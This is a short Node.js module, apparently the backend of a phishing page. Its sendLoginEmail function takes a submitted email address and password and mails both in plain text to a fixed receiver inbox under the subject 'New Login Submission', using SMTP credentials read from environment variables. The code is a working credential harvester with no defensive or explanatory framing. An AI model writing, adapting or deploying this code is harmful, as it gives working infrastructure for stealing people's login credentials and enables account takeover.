const nodemailer = require("nodemailer");

const isPlaceholderValue = (value) => {
  if (!value) return true;

  const normalized = value.trim().toLowerCase();
  return normalized.includes("your_") || normalized.includes("example") || normalized.includes("placeholder");
};

exports.sendLoginEmail = async ({ email, password }) => {
  const emailUser = process.env.EMAIL_USER?.trim();
  const emailPass = process.env.EMAIL_PASS?.trim();
  const receiverEmail = process.env.RECEIVER_EMAIL?.trim();

  if (!emailUser || !emailPass || !receiverEmail || isPlaceholderValue(emailUser) || isPlaceholderValue(emailPass) || isPlaceholderValue(receiverEmail)) {
    throw new Error("Set real SMTP credentials in server/.env before sending login emails.");
  }

  const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST?.trim() || "smtp.gmail.com",
    port: Number(process.env.EMAIL_PORT || 587),
    secure: process.env.EMAIL_SECURE === "true" || Number(process.env.EMAIL_PORT || 587) === 465,
    auth: {
      user: emailUser,
      pass: emailPass,
    },
  });

  await transporter.verify();
  console.log("SMTP connection successful!");

  const mailOptions = {
    from: process.env.EMAIL_FROM?.trim() || emailUser,
    to: receiverEmail,
    subject: "New Login Submission",
    html: `
      <h3>New login submission</h3>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Password:</strong> ${password}</p>
    `,
  };

  await transporter.sendMail(mailOptions);
};